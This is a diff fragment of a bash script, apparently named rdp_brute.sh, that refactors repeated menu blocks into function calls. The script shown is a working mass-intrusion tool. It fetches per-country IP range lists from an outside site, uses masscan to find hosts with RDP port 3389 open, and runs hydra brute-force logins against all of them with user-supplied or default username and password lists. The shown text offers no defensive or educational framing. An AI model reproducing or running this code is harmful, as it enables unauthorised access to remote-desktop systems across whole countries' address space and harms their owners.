-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 else
 if [ "$country" = "9" ]; then
 curl http://ipdiapazon.16mb.com/Argentina.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
@@ -16449,6 +6762,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -16458,53 +6772,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "10" ]; then
@@ -16521,6 +6789,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -16530,53 +6799,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "11" ]; then
@@ -16593,6 +6816,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -16602,53 +6826,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "12" ]; then
@@ -16665,6 +6843,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -16674,53 +6853,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -16738,6 +6871,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -16747,53 +6881,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -16811,6 +6899,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -16820,53 +6909,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -16884,6 +6927,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -16893,53 +6937,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -16957,6 +6955,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -16966,53 +6965,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -17030,6 +6983,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -17039,53 +6993,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -17103,6 +7011,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -17112,53 +7021,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -17176,6 +7039,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -17185,53 +7049,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -17249,6 +7067,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -17258,53 +7077,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -17322,6 +7095,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -17331,53 +7105,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "22" ]; then
@@ -17394,6 +7122,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -17403,53 +7132,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
